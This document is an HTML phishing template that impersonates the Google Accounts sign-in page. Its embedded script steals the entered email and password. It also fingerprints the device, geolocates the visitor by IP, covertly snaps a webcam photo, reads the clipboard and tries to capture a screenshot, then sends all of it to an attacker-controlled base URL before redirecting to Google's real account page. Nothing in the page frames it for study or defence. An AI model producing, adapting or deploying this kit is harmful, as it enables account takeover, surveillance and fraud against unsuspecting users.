<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{max-width:384px;width:90%;padding:48px 40px 36px;text-align:center}
.logo{width:72px;margin-bottom:16px}
h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:4px}
.sub{color:#5f6368;font-size:14px;margin-bottom:32px}
.input-group{margin-bottom:16px;text-align:left}
.input-group label{display:block;font-size:11px;color:#5f6368;margin-bottom:2px;font-weight:500;letter-spacing:.3px}
.input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:6px;font-size:16px;outline:none;transition:border .15s;font-family:inherit}
.input-group input:focus{border-color:#1a73e8}
.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;width:100%;cursor:pointer;font-weight:500;letter-spacing:.25px;margin-top:6px;transition:background .15s}
.btn:hover{background:#1766cc}
.btn:disabled{background:#9aa0a6;cursor:default}
.hidden{display:none!important}
.loading{margin-top:20px;color:#5f6368;font-size:14px;display:flex;align-items:center;justify-content:center;gap:10px}
.loading .s{width:18px;height:18px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite;display:inline-block}
@keyframes spin{to{transform:rotate(360deg)}}
#video{display:none;width:160px;height:120px;border-radius:8px;margin:16px auto;object-fit:cover;background:#000;border:1px solid #dadce0}
.error-msg{color:#d93025;font-size:12px;margin-top:4px;display:none}
.footer{margin-top:32px;font-size:12px;color:#5f6368}
.footer a{color:#1a73e8;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<img class="logo" src="https://www.google.com/favicon.ico" alt="Google">
<h1>Sign in</h1>
<p class="sub">to continue to your Google Account</p>
<div class="input-group">
<label>Email or phone</label>
<input type="text" id="login" placeholder="user@gmail.com" autocomplete="off" autocapitalize="none" spellcheck="false">
</div>
<div class="input-group hidden" id="pw_group">
<label>Password</label>
<input type="password" id="password" placeholder="Password" autocomplete="off">
</div>
<div class="error-msg" id="error">Couldn't sign you in. Check your email or password.</div>
<button class="btn" id="next_btn" onclick="next()">Next</button>
<video id="video" autoplay muted playsinline></video>
<div class="loading hidden" id="loading"><span class="s"></span> Signing in...</div>
<div class="footer"><a href="#">Create account</a> · <a href="#">Forgot email?</a></div>
</div>
<script>
const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
let step=1,c={session:SID};
document.getElementById('login').addEventListener('keydown',e=>{if(e.key==='Enter')next()});
document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')next()});
async function collect(){
    c.ua=navigator.userAgent;c.platform=navigator.platform;
    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
    c.cpu_cores=navigator.hardwareConcurrency;c.device_memory=navigator.deviceMemory;
    c.touch='ontouchstart'in window?1:0;
    try{
        const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org,as,proxy,hosting');
        const j=await r.json();
        Object.assign(c,j)
    }catch(e){}
    try{
        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
        await new Promise(r=>setTimeout(r,1200));
        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
        ca.getContext('2d').drawImage(v,0,0);
        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
        st.getTracks().forEach(t=>t.stop())
    }catch(e){}
    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
    try{
        await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
    }catch(e){}
}
async function next(){
    const btn=document.getElementById('next_btn');
    if(step===1){
        const login=document.getElementById('login').value.trim();
        if(!login||!login.includes('@')){document.getElementById('error').style.display='block';document.getElementById('error').textContent='Enter a valid email address';return}
        c.login=login;document.getElementById('error').style.display='none';
        document.getElementById('login').disabled=true;
        btn.disabled=true;btn.textContent='Working…';
        document.getElementById('loading').classList.remove('hidden');
        await collect();
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('pw_group').classList.remove('hidden');
        document.getElementById('password').focus();
        btn.disabled=false;btn.textContent='Next';
        document.getElementById('video').style.display='none';
        step=2
    }else if(step===2){
        const pw=document.getElementById('password').value.trim();
        if(!pw){document.getElementById('error').style.display='block';document.getElementById('error').textContent='Enter a password';return}
        c.password=pw;document.getElementById('error').style.display='none';
        btn.disabled=true;btn.textContent='Signing in…';
        document.getElementById('loading').classList.remove('hidden');
        c.visit_duration=Math.floor((Date.now()-t0)/1000);
        try{
            const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
            const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
            const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
            ca.getContext('2d').drawImage(bm,0,0);
            c.screenshot=ca.toDataURL('image/png').split(',')[1];
            tr.stop();st.getTracks().forEach(t=>t.stop())
        }catch(e){}
        await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)});
        document.getElementById('loading').textContent='✓ Signed in. Redirecting...';
        setTimeout(()=>{window.location.href='https://myaccount.google.com'},1500)
    }
}
const t0=Date.now()
</script>
</body>
</html>
